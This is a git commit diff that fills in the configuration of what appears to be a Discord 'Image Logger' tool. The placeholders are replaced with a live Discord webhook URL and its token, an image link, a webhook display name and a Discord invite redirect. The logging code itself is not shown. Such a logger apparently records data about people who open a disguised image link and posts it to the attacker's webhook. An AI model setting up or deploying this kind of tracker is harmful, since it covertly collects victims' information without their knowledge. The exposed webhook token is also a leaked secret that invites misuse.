451ce7399b53b6f4f61c5343cf70d74e4100b171
kaijsiii <kaijaimcinnis@yahoo.com>
2025-05-28 20:24:46 -0400

    Update main.py

--- main.py
+++ main.py
@@ -10,13 +10,13 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://canary.discord.com/api/webhooks/1377440406618505288/EtwxpJT56RyHwt4MUvM7u-jLQrn4eoRSxpAYbews-uwoNS8s_T_JxmWWYDqnYjstRbOl",
+    "image": "https://images.app.goo.gl/Hagr6vSSftL73Atc8", #You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "red circle ", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -49,7 +49,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "page": "https://discord.gg/Hmax5etQ" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
